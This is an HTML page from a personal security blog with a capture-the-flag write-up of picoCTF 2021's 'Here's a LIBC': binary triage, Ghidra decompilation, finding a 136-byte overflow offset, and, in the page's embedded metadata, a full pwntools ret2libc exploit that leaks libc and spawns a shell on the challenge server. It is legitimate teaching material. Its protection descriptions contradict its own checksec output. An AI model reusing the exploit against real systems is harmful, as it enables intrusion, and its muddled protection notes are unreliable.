@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>picoCTF 2021 - Here&#39;s a LIBC | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, picoctf2021, cybersecurity, binary exploit">
+<meta name="description" content="Description
+AUTHOR: MADSTACKS
+Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774
+Hints: PWNTools has a lot of useful features for getting offsets.
+References
+
+
+https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/
+
+
+https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc
+
+
+https://ctf101.org/binary-exploitation/relocation-read-only/
+
+
+https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc
+
+
+My Approach
+In challenges like this one, you are given an executable, a libc library, and a
+Makefile to work with. And the first thing I do is to find some information
+about the executable file.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2022-5-24-heresalibc/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2022-5-24-heresalibc/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2022-5-24-heresalibc/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="picoCTF 2021 - Here&#39;s a LIBC">
+  <meta property="og:description" content="Description AUTHOR: MADSTACKS
+Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774
+Hints: PWNTools has a lot of useful features for getting offsets.
+References https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/
+https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc
+https://ctf101.org/binary-exploitation/relocation-read-only/
+https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc
+My Approach In challenges like this one, you are given an executable, a libc library, and a Makefile to work with. And the first thing I do is to find some information about the executable file.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-05-24T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Picoctf2021">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Binary Exploit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="picoCTF 2021 - Here&#39;s a LIBC">
+<meta name="twitter:description" content="Description
+AUTHOR: MADSTACKS
+Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774
+Hints: PWNTools has a lot of useful features for getting offsets.
+References
+
+
+https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/
+
+
+https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc
+
+
+https://ctf101.org/binary-exploitation/relocation-read-only/
+
+
+https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc
+
+
+My Approach
+In challenges like this one, you are given an executable, a libc library, and a
+Makefile to work with. And the first thing I do is to find some information
+about the executable file.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "picoCTF 2021 - Here's a LIBC",
+      "item": "https://joonkim0625.github.io/posts/2022-5-24-heresalibc/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "picoCTF 2021 - Here's a LIBC",
+  "name": "picoCTF 2021 - Here\u0027s a LIBC",
+  "description": "Description AUTHOR: MADSTACKS\nDescription: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774\nHints: PWNTools has a lot of useful features for getting offsets.\nReferences https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/\nhttps://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc\nhttps://ctf101.org/binary-exploitation/relocation-read-only/\nhttps://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc\nMy Approach In challenges like this one, you are given an executable, a libc library, and a Makefile to work with. And the first thing I do is to find some information about the executable file.\n",
+  "keywords": [
+    "ctf", "picoctf2021", "cybersecurity", "binary exploit"
+  ],
+  "articleBody": "Description AUTHOR: MADSTACKS\nDescription: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774\nHints: PWNTools has a lot of useful features for getting offsets.\nReferences https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/\nhttps://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc\nhttps://ctf101.org/binary-exploitation/relocation-read-only/\nhttps://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc\nMy Approach In challenges like this one, you are given an executable, a libc library, and a Makefile to work with. And the first thing I do is to find some information about the executable file.\n$ file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped $ checksec --file=vuln 130 ⨯ RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH RW-RUNPATH 68) Symbols No 0 0 vuln By running file and checksec on the given file, we can see that the file is stripped, dynamically linked 64-bit binary with some protections enabled. Let’s take a quick look at what the protections do.\nRELRO: This is about Global Offset Table (GOT) and when it is set to “Full RELRO”, we won’t be able to overwrite a function pointer or hijack the control flow of the program. When it is set to “Partial RELRO”, which is the default setting in GCC, it will force the GOT to come before the BSS (block starting symbol) in memory so that it prevents the risk of a buffer overflows on a global variable overwriting GOT entries.\nCanary found: This means that there is a stack canary which prevents buffer overflows. It can still be exploited by bypassing the canary.\nNX (No eXecute) enabled: This means that there is NO memory region that is both writable and executable. So this can tell us that injecting shellcode might not be the option for this particular program.\nPIE enabled: PIE (Position Independent Executable) allows the program to be executed with randomized base address. So, if it is enabled, it prevents attacks such as ROP or ret2libc since attackers won’t be able to know any addresses unless there are some kinds of address leaks.\nAnd the next thing we can do is to get the source code by using Ghidra. Then we can get these three functions:\n// main void main(undefined4 param_1,undefined8 param_2) { char converted_str; char acStack168 [24]; undefined8 uStack144; undefined8 local_88; undefined4 local_7c; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined2 local_60; undefined local_5e; char *welcome_string; undefined8 local_48; ulong local_40; __gid_t local_34; ulong local_30; uStack144 = 0x40079c; local_88 = param_2; local_7c = param_1; setbuf(stdout,(char *)0x0); uStack144 = 0x4007a1; local_34 = getegid(); uStack144 = 0x4007bb; setresgid(local_34,local_34,local_34); local_40 = 0x1b; local_78 = 0x20656d6f636c6557; local_70 = 0x636520796d206f74; local_68 = 0x6576726573206f68; local_60 = 0x2172; local_5e = 0; local_48 = 0x1a; welcome_string = acStack168; for (local_30 = 0; local_30 \u003c local_40; local_30 = local_30 + 1) { converted_str = convert_case((int)*(char *)((long)\u0026local_78 + local_30),local_30); welcome_string[local_30] = converted_str; } puts(welcome_string); do { do_stuff(); } while( true ); } // do_stuff void do_stuff(void) { char cVar1; undefined local_89; char input_buf [112]; undefined8 local_18; ulong local_10; local_18 = 0; __isoc99_scanf(\"%[^\\n]\",input_buf); __isoc99_scanf(\u0026DAT_0040093a,\u0026local_89); for (local_10 = 0; local_10 \u003c 100; local_10 = local_10 + 1) { cVar1 = convert_case((int)input_buf[local_10],local_10); input_buf[local_10] = cVar1; } puts(input_buf); return; } Gathering Information Looking at the main function, within the while loop, we can see that do_stuff() does the most work here. So taking a look at do_stuff(), we can see that it accepts user input until it sees a new line to local_88[112]. I feel like we can do something by overflowing the buffer! However, remember, this file has NX enabled so we just can’t overwrite the address to return to the stack (so we should have the return address point to something that is already in libc!).\nFirst, let’s just try to pass in some arbitrary stuff to see if we can crash the program first.\nRunning the program under gef, I created a cyclic with the size of 256 bytes and n=8. Then it gives you something like this ‘aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac’. Once you provide this as the input to the prompt you see when the program gets executed, we can see that $rsp gets overwritten by the input.\n0x007fffffffde58│+0x0000: \"jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]\" ← $rsp As we can see, $rsp starts with ‘jaab…’ and if you move onto the next assembly instruction, the program crashes. So I think that if we\nUse metasploit framework’s pattern_create and pattern_offset, I was able to get the offset 136 which means the gap between the buffer and the return address is 136 bytes big. So our strategy should be to fill 136 bytes with a bunch of As and fil the return address with whatever instructions that we want the program to execute instead.\nNext thing we need to do is to find things that we can use to achieve our goal. This means that we would need to find memory addresses to functions that we need in order to lunch a shell on this remote server.\nASLR ASLR is a mitigation technique that is used to prevent memory exploitation by randomizing memory addresses of stack, heap, and libraries each time a process runs. Because of this, we can know that the functions that we should look from libc will always move aroud in terms of the memory addresses to them. What we should do in this case is to use one of the built-in functions that is used in the program to find out the offset to libc library that is loaded into the program at the moment. Once we get a memory address, we are going to use that to calcuate offsets to the functions that we need .\nFrom the source code above, we can see that puts() is used in do_stuff() after accepting a user input and modifying the input. So it is a hint that we can use puts() to calculate the offset to the libc library.\nPLT \u0026 GOT Reference: https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got\nPLT: Procedure Linkage Table which is used to call external procedures/functions whose address isn’t known in the time of linking and is left to be resolved by the dynamic linker at run time\nPLT is a readable section of memory that jumps to the GOT to call a function. GOT by extension is a writable section of memory that looks up the function pointers through the dynamic linker the first time it is called.\nSolution pwntools provides many great features and we can utilize one of the features to get the plt/got address to puts and main functions.\nfrom pwn import * vuln = ELF(\"./vuln_patched\") context.binary = './vuln_patched' libc = ELF(\"./libc.so.6\") # r = vuln.process() r = remote(\"mercury.picoctf.net\", 1774) # get the address to the puts function in PLT puts_plt = vuln.plt['puts'] # get the addres to the main function in PLT main_plt = vuln.symbols['main'] # As the GOT is part of the binary, it will always be a constant offset away from the base puts_got = vuln.got['puts'] # this is the gadget 'pop rdi, ret' # why this? here is a great article that explains this well # https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets gadget = 0x400913 payload = b\"A\" * 136 payload += p64(gadget) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main_plt) print(payload) print(r.recvline()) r.sendline(payload) #r.interactive() # second rop print(r.recvline()) received_line = r.recvline().strip() print(received_line) leak = u64(received_line.ljust(8, b\"\\x00\")) print(hex(leak)) # Once we get the pointers to to puts' plt/got and main's address (the purpose of the first payload), # we can get libc address using libc.sysmbols['puts'] libc.address = leak - libc.symbols['puts'] # now we have the base libc addr binsh = next(libc.search(b\"/bin/sh\")) # the actual string is the next one from the memory address that is being pointed to system = libc.symbols['system'] payload2 = b\"A\" * 136 payload2 += p64(0x000000000040052e) # ret instruction (gadget) to algin the stack payload2 += p64(gadget) # pop rdi, ret payload2 += p64(binsh) # this will be put into rdi payload2 += p64(system) # call system with /bin/sh as its first arg r.clean() r.sendline(payload2) r.interactive() This was a very interesting challenge that taught me a lot of things. Please let me know if I missed something or if my understanding is not correct by sending me an email. Thanks for reading!\n",
+  "wordCount" : "1355",
+  "inLanguage": "en",
+  "datePublished": "2022-05-24T00:00:00Z",
+  "dateModified": "2022-05-24T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2022-5-24-heresalibc/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      picoCTF 2021 - Here&#39;s a LIBC
+    </h1>
+    <div class="post-meta"><span title='2022-05-24 00:00:00 +0000 UTC'>May 24, 2022</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>AUTHOR: MADSTACKS</p>
+<p>Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774</p>
+<p>Hints: PWNTools has a lot of useful features for getting offsets.</p>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ol>
+<li>
+<p><a href="https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/">https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/</a></p>
+</li>
+<li>
+<p><a href="https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc">https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc</a></p>
+</li>
+<li>
+<p><a href="https://ctf101.org/binary-exploitation/relocation-read-only/">https://ctf101.org/binary-exploitation/relocation-read-only/</a></p>
+</li>
+<li>
+<p><a href="https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc">https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc</a></p>
+</li>
+</ol>
+<h2 id="my-approach">My Approach<a hidden class="anchor" aria-hidden="true" href="#my-approach">#</a></h2>
+<p>In challenges like this one, you are given an executable, a libc library, and a
+Makefile to work with. And the first thing I do is to find some information
+about the executable file.</p>
+<pre tabindex="0"><code>$ file vuln             
+vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped
+</code></pre><pre tabindex="0"><code>$ checksec --file=vuln                                                                                                                                                               130 ⨯
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68) Symbols       No    0               0               vuln
+</code></pre><p>By running <code>file</code> and <code>checksec</code> on the given file, we can see that the file is
+stripped, dynamically linked 64-bit binary with some protections enabled. Let&rsquo;s
+take a quick look at what the protections do.</p>
+<ul>
+<li>
+<p>RELRO: This is about Global Offset Table (GOT) and when it is set to &ldquo;Full
+RELRO&rdquo;, we won&rsquo;t be able to overwrite a function pointer or hijack the
+control flow of the program. When it is set to &ldquo;Partial RELRO&rdquo;, which is the
+default setting in GCC, it will force the GOT to come before the BSS (block
+starting symbol) in
+memory so that it prevents the risk of a buffer overflows on a global
+variable overwriting GOT entries.</p>
+</li>
+<li>
+<p>Canary found: This means that there is a stack canary which prevents buffer
+overflows. It can still be exploited by bypassing the canary.</p>
+</li>
+<li>
+<p>NX (No eXecute) enabled: This means that there is <strong>NO</strong> memory region that is both writable
+and executable. So this can tell us that injecting shellcode might not be
+the option for this particular program.</p>
+</li>
+<li>
+<p>PIE enabled: PIE (Position Independent Executable) allows the program to be
+executed with randomized base address. So, if it is enabled, it prevents
+attacks such as ROP or ret2libc since attackers won&rsquo;t be able to know any
+addresses unless there are some kinds of address leaks.</p>
+</li>
+</ul>
+<p>And the next thing we can do is to get the source code by using Ghidra. Then we
+can get these three functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// main
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(undefined4 param_1,undefined8 param_2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> converted_str;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> acStack168 [<span style="color:#ae81ff">24</span>];
+</span></span><span style="display:flex;"><span>  undefined8 uStack144;
+</span></span><span style="display:flex;"><span>  undefined8 local_88;
+</span></span><span style="display:flex;"><span>  undefined4 local_7c;
+</span></span><span style="display:flex;"><span>  undefined8 local_78;
+</span></span><span style="display:flex;"><span>  undefined8 local_70;
+</span></span><span style="display:flex;"><span>  undefined8 local_68;
+</span></span><span style="display:flex;"><span>  undefined2 local_60;
+</span></span><span style="display:flex;"><span>  undefined local_5e;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>welcome_string;
+</span></span><span style="display:flex;"><span>  undefined8 local_48;
+</span></span><span style="display:flex;"><span>  ulong local_40;
+</span></span><span style="display:flex;"><span>  __gid_t local_34;
+</span></span><span style="display:flex;"><span>  ulong local_30;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  uStack144 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40079c</span>;
+</span></span><span style="display:flex;"><span>  local_88 <span style="color:#f92672">=</span> param_2;
+</span></span><span style="display:flex;"><span>  local_7c <span style="color:#f92672">=</span> param_1;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>  uStack144 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4007a1</span>;
+</span></span><span style="display:flex;"><span>  local_34 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
+</span></span><span style="display:flex;"><span>  uStack144 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4007bb</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(local_34,local_34,local_34);
+</span></span><span style="display:flex;"><span>  local_40 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1b</span>;
+</span></span><span style="display:flex;"><span>  local_78 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20656d6f636c6557</span>;
+</span></span><span style="display:flex;"><span>  local_70 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x636520796d206f74</span>;
+</span></span><span style="display:flex;"><span>  local_68 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6576726573206f68</span>;
+</span></span><span style="display:flex;"><span>  local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2172</span>;
+</span></span><span style="display:flex;"><span>  local_5e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_48 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1a</span>;
+</span></span><span style="display:flex;"><span>  welcome_string <span style="color:#f92672">=</span> acStack168;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; local_30 <span style="color:#f92672">&lt;</span> local_40; local_30 <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    converted_str <span style="color:#f92672">=</span> <span style="color:#a6e22e">convert_case</span>((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_78 <span style="color:#f92672">+</span> local_30),local_30);
+</span></span><span style="display:flex;"><span>    welcome_string[local_30] <span style="color:#f92672">=</span> converted_str;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(welcome_string);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">do_stuff</span>();
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// do_stuff
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">do_stuff</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cVar1;
+</span></span><span style="display:flex;"><span>  undefined local_89;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input_buf [<span style="color:#ae81ff">112</span>];
+</span></span><span style="display:flex;"><span>  undefined8 local_18;
+</span></span><span style="display:flex;"><span>  ulong local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>,input_buf);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#f92672">&amp;</span>DAT_0040093a,<span style="color:#f92672">&amp;</span>local_89);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; local_10 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; local_10 <span style="color:#f92672">=</span> local_10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    cVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">convert_case</span>((<span style="color:#66d9ef">int</span>)input_buf[local_10],local_10);
+</span></span><span style="display:flex;"><span>    input_buf[local_10] <span style="color:#f92672">=</span> cVar1;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(input_buf);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="gathering-information">Gathering Information<a hidden class="anchor" aria-hidden="true" href="#gathering-information">#</a></h3>
+<p>Looking at the main function, within the while loop, we can see that
+<code>do_stuff()</code> does the most work here. So taking a look at <code>do_stuff()</code>, we can
+see that it accepts user input until it sees a new line to local_88[112]. I feel
+like we can do something by overflowing the buffer! However, remember, this file
+has NX enabled so we just can&rsquo;t overwrite the address to return to the stack (so
+we should have the return address point to something that is already in libc!).</p>
+<p>First, let&rsquo;s just try to pass in some arbitrary stuff to see if we can crash the
+program first.</p>
+<p>Running the program under gef, I created a cyclic with the size of 256 bytes and
+n=8. Then it gives you something like this
+&lsquo;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&rsquo;.
+Once you provide this as the input to the prompt you see when the program gets
+executed, we can see that <code>$rsp</code> gets overwritten by the input.</p>
+<pre tabindex="0"><code>0x007fffffffde58│+0x0000: &#34;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]&#34;      ← $rsp
+</code></pre><p>As we can see, <code>$rsp</code> starts with &lsquo;jaab&hellip;&rsquo; and if you move onto the next
+assembly instruction, the program crashes. So I think that if we</p>
+<p>Use metasploit framework&rsquo;s pattern_create and pattern_offset, I was able to get
+the offset 136 which means the gap between the buffer and the return address is
+136 bytes big. So our strategy should be to fill 136 bytes with a bunch of As
+and fil the return address with whatever instructions that we want the program
+to execute instead.</p>
+<p>Next thing we need to do is to find things that we can use to achieve our goal.
+This means that we would need to find memory addresses to functions that we need
+in order to lunch a shell on this remote server.</p>
+<h3 id="aslr">ASLR<a hidden class="anchor" aria-hidden="true" href="#aslr">#</a></h3>
+<p>ASLR is a mitigation technique that is used to prevent memory exploitation by
+randomizing memory addresses of stack, heap, and libraries each time a process runs. Because of this, we can know that the functions that we should look from <code>libc</code> will always move aroud in terms of the memory addresses to them. What we should do in this case is to use one of the built-in functions that is used in the program to find out the offset to <code>libc</code> library that is loaded into the program at the moment. Once we get a memory address, we are going to use that to calcuate offsets to the functions that we need .</p>
+<p>From the source code above, we can see that <code>puts()</code> is used in <code>do_stuff()</code>
+after accepting a user input and modifying the input. So it is a hint that we
+can use <code>puts()</code> to calculate the offset to the libc library.</p>
+<h3 id="plt--got">PLT &amp; GOT<a hidden class="anchor" aria-hidden="true" href="#plt--got">#</a></h3>
